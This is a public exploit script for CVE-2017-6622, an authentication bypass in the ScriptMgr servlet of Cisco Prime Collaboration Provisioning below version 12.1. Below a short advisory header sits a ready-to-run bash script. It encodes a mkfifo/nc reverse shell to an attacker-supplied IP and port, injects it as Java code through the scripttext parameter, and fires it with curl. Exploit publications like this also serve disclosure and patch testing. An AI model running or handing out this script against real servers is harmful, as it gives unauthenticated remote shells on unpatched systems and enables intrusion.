# Exploit Title: Cisco Prime Collaboration Provisioning < 12.1 - ScriptMgr Servlet Authentication Bypass Remote Code Execution
# Date: 09/27/2017
# Exploit Author: Adam Brown
# Vendor Homepage: https://cisco.com
# Software Link: https://software.cisco.com/download/release.html?mdfid=286308336&softwareid=286289070&release=11.6&flowid=81443
# Version: < 12.1
# Tested on: Debian 8
# CVE : 2017-6622
# Reference: https://www.tenable.com/plugins/index.php?view=single&id=101531
# Mitigation - Upgrade your Cisco Prime Collaboration Provisioning server to 12.1 or later.

# Description - This vulnerability allows an unauthenticated attacker to execute arbitrary Java code on a system running Cisco Prime Collaboration Provisioning server < 12.1 via a scripttext parameter in the ScriptMgr page.

# Usage: ./prime-shell.sh <TARGET-IP> <ATTACKER-IP> <ATTACKER-PORT>

function encode() {
	echo "$1" | perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'
}

TARGET=$1
ATTACKER=$2
PORT=$3

BASH=$(encode "/bin/bash")
COMMAND=$(encode "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER $PORT >/tmp/f")
SCRIPTTEXT="Runtime.getRuntime().exec(new%20String[]{\"$BASH\",\"-c\",\"$COMMAND\"});"

curl --head -gk "https://$TARGET/cupm/ScriptMgr?command=compile&language=bsh&script=foo&scripttext=$SCRIPTTEXT"